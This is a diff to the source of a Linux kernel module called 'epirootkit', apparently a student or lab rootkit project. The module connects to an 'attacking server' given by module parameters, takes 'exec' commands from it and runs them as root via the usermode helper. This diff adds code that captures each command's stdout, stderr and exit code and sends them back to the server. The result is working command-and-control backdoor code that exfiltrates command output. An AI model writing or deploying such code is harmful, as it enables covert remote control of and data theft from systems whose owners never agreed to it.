@@ -37,6 +37,14 @@ MODULE_PARM_DESC(ip, "IPv4 of attacking server");
 MODULE_PARM_DESC(port, "Port of attacking server");
 MODULE_PARM_DESC(message, "Message to send to the attacking server");
 
+struct exec_code_stds{
+	int code;
+	char *std_out;
+	char *std_err;
+};
+
+static struct exec_code_stds exec_result;
+
 /**
  * @brief Closes the communication by releasing the socket.
  *
@@ -87,59 +95,74 @@ enum text_level {
 };
 
 /**
- * @brief Prints the content of a file to the kernel log.
+ * @brief Reads the content of a file into a dynamically allocated buffer.
  *
  * @param filename The name of the file to read.
- * @param level The log level to use for printing (INFO, WARN, ERR, CRIT).
- * @return int - Returns SUCCESS on success, or an error code on failure.
+ * @return char* - Returns a pointer to the buffer containing the file content, or NULL on failure.
+ *                 The caller is responsible for freeing the allocated buffer.
  */
-static int print_file_content(char *filename, enum text_level level)
+static char *read_file(char *filename)
 {
 	struct file *file = NULL;
-	// Open the file for reading
-	file = filp_open(filename, O_RDONLY, 0);
-	if (IS_ERR(file)) {
-		pr_err("epirootkit: print_file_content: failed to open file %s\n", filename);
-		return -ENOENT;
-	}
-
 	char *buf = NULL;
 	loff_t pos = 0;
 	int len = 0;
 
+	// Open the file for reading
+	file = filp_open(filename, O_RDONLY, 0);
+	if (IS_ERR(file)) {
+		pr_err("epirootkit: read_file: failed to open file %s\n", filename);
+		return NULL;
+	}
+
 	// Allocate memory for the buffer
 	buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-	if (!buf)
-		return -ENOMEM;
+	if (!buf) {
+		filp_close(file, NULL);
+		return NULL;
+	}
 
 	// Read the file content into the buffer
 	len = kernel_read(file, buf, STD_BUFFER_SIZE - 1, &pos);
 	if (len < 0) {
 		kfree(buf);
-		return len;
+		filp_close(file, NULL);
+		return NULL;
 	}
 
 	buf[len] = '\0'; // Null-terminate the string
+	filp_close(file, NULL);
+	return buf;
+}
+
+/**
+ * @brief Prints the content of a buffer to the kernel log.
+ *
+ * @param content The content to print.
+ * @param level The log level to use for printing (INFO, WARN, ERR, CRIT).
+ */
+static void print_file(char *content, enum text_level level)
+{
+	if (!content) {
+		pr_err("epirootkit: print_file: content is NULL\n");
+		return;
+	}
 
 	// Print the content based on the specified log level
 	switch (level) {
 	case WARN:
-		pr_warn("%s", buf);
+		pr_warn("%s", content);
 		break;
 	case ERR:
-		pr_err("%s", buf);
+		pr_err("%s", content);
 		break;
 	case CRIT:
-		pr_crit("%s", buf);
+		pr_crit("%s", content);
 		break;
 	default:
-		pr_info("%s", buf);
+		pr_info("%s", content);
 		break;
 	}
-
-	kfree(buf);
-	filp_close(file, NULL);
-	return SUCCESS;
 }
 
 /**
@@ -197,22 +220,68 @@ static int exec_str_as_command(char *user_cmd)
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);
 
-	// Print the output of the command (if not redirected)
-	if(!user_redirect_stdout){
-		pr_info("epirootkit: exec_str_as_command: command output:\n");
-		print_file_content(stdout_file, INFO);
-	}else{
-		pr_info("epirootkit: exec_str_as_command: command output redirected to custom file\n");
-	}
-	if(!user_redirect_stderr){
-		pr_err("epirootkit: exec_str_as_command: command error output:\n");
-		print_file_content(stderr_file, ERR);
-	}else{
-		pr_err("epirootkit: exec_str_as_command: command error output redirected to custom file\n");
+	// Retieve stdout and stderr
+	char *stdout_content = read_file(stdout_file);
+	char *stderr_content = read_file(stderr_file);
+	if (!stdout_content || !stderr_content) {
+		if (stdout_content)
+			kfree(stdout_content);
+		if (stderr_content)
+			kfree(stderr_content);
+		kfree(cmd);
+		return -ENOENT;
 	}
 
+	// Update the exec_result structure with the command's output and return code
+	exec_result.code = status;
+	strncpy(exec_result.std_out, stdout_content, STD_BUFFER_SIZE - 1);
+	strncpy(exec_result.std_err, stderr_content, STD_BUFFER_SIZE - 1);
+	exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0'; // Ensure null termination
+	exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0'; // Ensure null termination
+
 	// Cleanup: free memory
+	kfree(stdout_content);
+	kfree(stderr_content);
 	kfree(cmd);
+	return SUCCESS;
+}
+
+/**
+ * @brief Sends a message to the server.
+ *
+ * This function is responsible for transmitting a given message
+ * to a predefined server. The server details and connection
+ * mechanism are assumed to be handled elsewhere in the code.
+ *
+ * @param message A pointer to a null-terminated string containing
+ *                the message to be sent. The caller must ensure
+ *                that the message is properly formatted and
+ *                allocated.
+ *
+ * @return The return value typically indicates the success or
+ *         failure of the operation. Specific return codes and
+ *         their meanings should be documented in the implementation.
+ */
+int send_to_server(char *message)
+{
+	struct kvec vec = { 0 };
+	struct msghdr msg = { 0 };
+	int ret_code = 0;
+
+	if (!sock) {
+		pr_err("epirootkit: send_to_server: socket is NULL\n");
+		return FAILURE;
+	}
+
+	vec.iov_base = message;
+	vec.iov_len = strlen(message);
+
+	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+	if (ret_code < 0) {
+		pr_err("epirootkit: send_to_server: failed to send message: %d\n", ret_code);
+		return FAILURE;
+	}
+
 	return SUCCESS;
 }
 
@@ -265,19 +334,16 @@ static int network_worker(void *data)
 		break; 
 	}
 
-	vec.iov_base = (void *)message;
-	vec.iov_len = strlen(message);
-
-	// Attempt to send the initial message
+	// Attempt to send the initial message using send_to_server
 	int attempts = 0;
 	do {
-		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-		if (ret_code < 0) {
-			pr_err("epirootkit: network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret_code, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
+		ret_code = send_to_server(message);
+		if (ret_code != SUCCESS) {
+			pr_err("epirootkit: network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
-	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
+	} while (ret_code != SUCCESS && attempts < MAX_SENDING_MSG_ATTEMPTS);
 
 	// If all attempts to send the message failed, abort
 	if (ret_code < 0) {
@@ -311,10 +377,24 @@ static int network_worker(void *data)
 
 		// Parse and handle the received command
 		if (strncmp(recv_buffer, "exec ", 5) == 0) {
+			// Extract the command from the received message
 			char *command = recv_buffer + 5;
 			command[strcspn(command, "\n")] = '\0';
 			pr_info("network_worker: executing command: %s\n", command);
 			exec_str_as_command(command);
+
+			// Send the result back to the server
+			char result_msg[2*(STD_BUFFER_SIZE)];
+			snprintf(result_msg, 
+						sizeof(result_msg), 
+						"execution result:\nstdout:\n%s\nstderr:\n%s\nterminated with code %d\n", 
+						exec_result.std_out, exec_result.std_err, exec_result.code);
+			ret_code = send_to_server(result_msg);
+			if (ret_code != SUCCESS) {
+				pr_err("epirootkit: network_worker: failed to send result message\n");
+			}
+			pr_info("epirootkit: network_worker: command result sent\n");
+
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
 			pr_info("network_worker: killcom received, exiting...\n");
 			break;
@@ -338,6 +418,20 @@ static int network_worker(void *data)
 static int __init epirootkit_init(void)
 {
 	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
+
+	// Init structure for exec_code_stds
+	// code: return code of the command
+	// std_out: output of the command
+	// std_err: error output of the command
+	exec_result.code = 0;
+	exec_result.std_out = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
+	exec_result.std_err = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
+	if (!exec_result.std_out || !exec_result.std_err) {
+		pr_err("epirootkit: epirootkit_init: memory allocation failed\n");
+		kfree(exec_result.std_out);
+		kfree(exec_result.std_err);
+		return -ENOMEM;
+	}
 
 	// Start a kernel thread that will handle network communication
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
